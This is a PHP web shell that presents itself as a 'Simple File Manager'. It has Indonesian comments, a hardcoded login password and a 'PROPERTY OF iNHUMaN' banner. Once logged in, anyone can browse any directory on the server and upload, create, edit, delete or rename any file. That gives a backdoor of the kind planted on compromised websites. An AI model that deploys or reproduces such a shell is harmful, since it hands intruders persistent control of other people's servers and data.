<?php
session_start();

// Cek apakah sudah login
if(isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true){
    // Jika sudah login, lanjutkan ke file manager
    $currentDir = isset($_GET['dir']) ? $_GET['dir'] : __DIR__;

    // Periksa apakah direktori dapat dibaca
    if (!is_dir($currentDir) || !is_readable($currentDir)) {
        echo "Error: Unable to read directory.";
        exit;
    }

    $dirs = scandir($currentDir);
    $folders = [];
    $files = [];

    foreach ($dirs as $dir) {
        if ($dir === '.' || $dir === '..') continue;
        $fullPath = $currentDir . DIRECTORY_SEPARATOR . $dir;
        if (is_dir($fullPath)) {
            $folders[] = $dir;
        } else {
            $files[] = $dir;
        }
    }

    function getPermissions($path) {
        if(file_exists($path) && is_readable($path)) {
            return substr(sprintf('%o', fileperms($path)), -4);
        } else {
            return "N/A";
        }
    }
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Simple File Manager</title>
    <link href='https://fonts.googleapis.com/css?family=Montserrat' rel='stylesheet'>
    <style>
        body { font-family: 'Montserrat', sans-serif; /* Menggunakan font Montserrat */ background-color: #FFE4C4; }
        .navbar { overflow: hidden; background-color: #483D8B; padding: 10px; }
        .navbar a {
            float: left;
            display: block;
            color: #fff;
            text-align: center;
            padding: 14px 20px; /* Atur padding untuk memberikan ukuran yang sama di semua tombol */
            text-decoration: none;
            border-radius: 5px;
            margin: 0 10px;
            border: 1px solid #fff;
        }
        @media screen and (max-width: 600px) {
            .navbar a {
                float: none;
                display: block;
                text-align: center;
                width: 93%; /* Tombol akan mengisi lebar penuh */
                margin: 5px 0; /* Atur jarak antara tombol */
            }
        }
        .navbar a:hover { background-color: #fff; color: #483D8B; }
        .navbar a.active { background-color: #4CAF50; color: white; }
        .system-info { float: right; color: #f2f2f2; margin: 0 5px; }
        @media screen and (max-width: 600px) {
            table { width: 100%; border-collapse: collapse; margin-top: 20px; }
            th, td { border: 1px solid #ddd; padding: 8px; }
            th { background-color: #f2f2f2; text-align: left; } }
            .writable { color: green; }
            .not-writable { color: red; }
            .hidden-form { display: none; }
            .form-container { 
                max-width: 600px; 
                margin: auto; 
                padding: 20px; 
                border: 1px solid #ddd; 
                background-color: #f9f9f9; 
                box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1); 
                border-radius: 10px;
            }
            .form-container h3 { margin-top: 0; }
            .form-container input[type="text"],
.form-container input[type="file"],
.form-container textarea {
    width: 100%; 
    padding: 10px; 
    margin: 5px 0 10px 0; 
    border: 1px solid #ccc; 
    border-radius: 5px; 
    box-sizing: border-box;
    background-color: #483D8B; /* Ubah warna latar belakang sesuai dengan warna tombol */
    color: white; /* Ubah warna teks menjadi putih */
}
            .form-container button {
                background-color: #483D8B; 
                color: white; 
                padding: 10px 20px; 
                border: 1px solid #483D8B; 
                border-radius: 5px; 
                cursor: pointer;
            }
            .form-container button:hover { background-color: #fff; color: #483D8B; }
            @media screen and (max-width: 600px) {
                .navbar a { 
                    padding: 10px; 
                    margin: 5px 0;
                }
            }
        }
        @media screen and (min-width: 601px) {
        table { 
            width: 80%; 
            margin: 20px auto; 
            border-collapse: collapse; /* menggabungkan garis tepi sel */
        }
        th, td { 
            padding: 12px 15px; 
            border: 1px solid #ddd; /* menambahkan garis tepi untuk sel */
            text-align: left; /* menyesuaikan teks ke kiri untuk sel data */
        }
        th { 
            background-color: #f2f2f2; /* memberi latar belakang warna abu-abu untuk sel header */
    </style>
</head>
<body>
<div class="navbar">
    <a href="#" onclick="toggleForm('create-folder-form')">Create Folder</a>
    <a href="#" onclick="toggleForm('upload-file-form')">Upload File</a>
    <a href="#" onclick="toggleForm('create-file-form')">Create File</a>
</div>

<h2>PROPERTY OF <b>iNHUMaN</b></h2>

<form id="create-folder-form" class="hidden-form form-container" action="" method="post">
    <h3>Create Folder</h3>
    <input type="text" name="folder_name" placeholder="Folder Name" required>
    <button type="submit" name="add_folder">Add Folder</button>
</form>

<form id="upload-file-form" class="hidden-form form-container" action="" method="post" enctype="multipart/form-data">
    <h3>Upload File</h3>
    <input type="file" name="file" required>
    <button type="submit" name="add_file">Add File</button>
</form>

<form id="create-file-form" class="hidden-form form-container" action="" method="post">
    <h3>Create File</h3>
    <input type="text" name="file_name" placeholder="File Name" required>
    <button type="submit" name="create_file">Create File</button>
</form>

<p>Current Directory: 
<?php 
$path_parts = explode(DIRECTORY_SEPARATOR, $currentDir);
$path_display = "";
foreach ($path_parts as $index => $path_part) {
    if ($index > 0) {
        echo "/";
    }
    $path_display .= $path_part;
    echo "<a href='?dir=" . urlencode($path_display) . "'>$path_part</a>";
    $path_display .= DIRECTORY_SEPARATOR;
}
?>
</p>
<table>
    <thead>
        <tr>
            <th>Name</th>
            <th>Type</th>
            <th>Permission</th>
            <th>Action</th>
        </tr>
    </thead>
    <tbody>
    <?php foreach ($folders as $folder): ?>
<tr>
    <?php $fullPath = $currentDir . DIRECTORY_SEPARATOR . $folder; ?>
    <td data-label="Name"><a href="?dir=<?php echo urlencode($fullPath); ?>"><?php echo $folder; ?></a></td>
    <td data-label="Type">Folder</td>
    <td data-label="Permission" class="<?php echo is_writable($fullPath) ? 'writable' : 'not-writable'; ?>">
        <?php echo getPermissions($fullPath); ?>
    </td>
    <td data-label="Action">
        <a href="?delete=<?php echo urlencode($fullPath); ?>" onclick="return confirm('Are you sure you want to delete this folder?')">Delete</a> | <a href="?rename=<?php echo urlencode($fullPath); ?>">Rename</a>
    </td>
</tr>
<?php endforeach; ?>
<?php foreach ($files as $file): ?>
<tr>
    <?php $fullPath = $currentDir . DIRECTORY_SEPARATOR . $file; ?>
    <td data-label="Name"><?php echo $file; ?></td>
    <td data-label="Type">File</td>
    <td data-label="Permission" class="<?php echo is_writable($fullPath) ? 'writable' : 'not-writable'; ?>">
        <?php echo getPermissions($fullPath); ?>
    </td>
    <td data-label="Action">
        <a href="?edit=<?php echo urlencode($fullPath); ?>">Edit</a> | <a href="?delete=<?php echo urlencode($fullPath); ?>" onclick="return confirm('Are you sure you want to delete this file?')">Delete</a> | <a href="?rename=<?php echo urlencode($fullPath); ?>">Rename</a>
    </td>
</tr>
<?php endforeach; ?>
    </tbody>
</table>

<script>
    function toggleForm(formId) {
        var forms = document.querySelectorAll('.hidden-form');
        forms.forEach(function(form) {
            if (form.id === formId) {
                form.style.display = form.style.display === 'none' || form.style.display === '' ? 'block' : 'none';
            } else {
                form.style.display = 'none';
            }
        });
    }
</script>

<?php
if (isset($_POST['add_folder'])) {
    $folderName = $_POST['folder_name'];
    mkdir($currentDir . DIRECTORY_SEPARATOR . $folderName);
    header("Location: {$_SERVER['PHP_SELF']}?dir=" . urlencode($currentDir));
    exit;
}

if (isset($_POST['add_file'])) {
    $file = $_FILES['file'];
    move_uploaded_file($file['tmp_name'], $currentDir . DIRECTORY_SEPARATOR . $file['name']);
    header("Location: {$_SERVER['PHP_SELF']}?dir=" . urlencode($currentDir));
    exit;
}

if (isset($_POST['create_file'])) {
    $fileName = $_POST['file_name'];
    $filePath = $currentDir . DIRECTORY_SEPARATOR . $fileName;
    if (!file_exists($filePath)) {
        fopen($filePath, "w");
        header("Location: {$_SERVER['PHP_SELF']}?dir=" . urlencode($currentDir));
        exit;
    } else {
        echo "File already exists.";
    }
}

if (isset($_GET['edit'])) {
    $fileToEdit = urldecode($_GET['edit']);
    if (file_exists($fileToEdit)) {
        $fileContent = file_get_contents($fileToEdit);
        ?>

        <div class="form-container">
            <h3>Edit File: </h3>
            <form action="" method="post">
                <textarea name="file_content" rows="10" cols="50" style="width: 100%;"><?php echo htmlentities($fileContent); ?></textarea><br>
                <input type="hidden" name="file_to_edit" value="<?php echo $fileToEdit; ?>">
                <button type="submit" name="save_file">Save Changes</button>
            </form>
        </div>

        <?php
    }
}

if (isset($_POST['save_file'])) {
    $fileToEdit = $_POST['file_to_edit'];
    $fileContent = $_POST['file_content'];
    file_put_contents($fileToEdit, $fileContent);
    header("Location: {$_SERVER['PHP_SELF']}?dir=" . urlencode($currentDir));
    exit;
}

if (isset($_GET['delete'])) {
    $fileToDelete = urldecode($_GET['delete']);
    if (is_dir($fileToDelete)) {
        rmdir($fileToDelete);
    } else {
        unlink($fileToDelete);
    }
    header("Location: {$_SERVER['PHP_SELF']}?dir=" . urlencode($currentDir));
    exit;
}

if (isset($_GET['rename'])) {
    $fileToRename = urldecode($_GET['rename']);
    ?>

    <div class="form-container">
        <h3>Rename: </h3>
        <form action="" method="post">
            <input type="text" name="new_name" placeholder="New Name" required style="width: 100%;">
            <input type="hidden" name="file_to_rename" value="<?php echo $fileToRename; ?>">
            <button type="submit" name="rename_file">Rename</button>
        </form>
    </div>

    <?php
}

if (isset($_POST['rename_file'])) {
    $fileToRename = $_POST['file_to_rename'];
    $newName = $_POST['new_name'];
    $newPath = dirname($fileToRename) . DIRECTORY_SEPARATOR . $newName;
    rename($fileToRename, $newPath);
    header("Location: {$_SERVER['PHP_SELF']}?dir=" . urlencode($currentDir));
    exit;
}
?>
</body>
</html>
<?php
} else {
    // Jika belum login, tampilkan form login
    if(isset($_POST['password'])) {
        // Password yang benar
        $password = 'jawa'; // Ganti dengan password yang diinginkan

        if($_POST['password'] == $password) {
            $_SESSION['loggedin'] = true;
            echo '<script type="text/javascript">
            window.location = "'.$_SERVER['PHP_SELF'].'"
            </script>';
        } else {
            echo 'Password salah!';
        }
    }
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>Login</title>
    </head>
    <body>
        <form method="POST">
            <input type="password" name="password" placeholder="Password" required>
            <input type="submit" value="Login">
        </form>
    </body>
    </html>
<?php
}
?>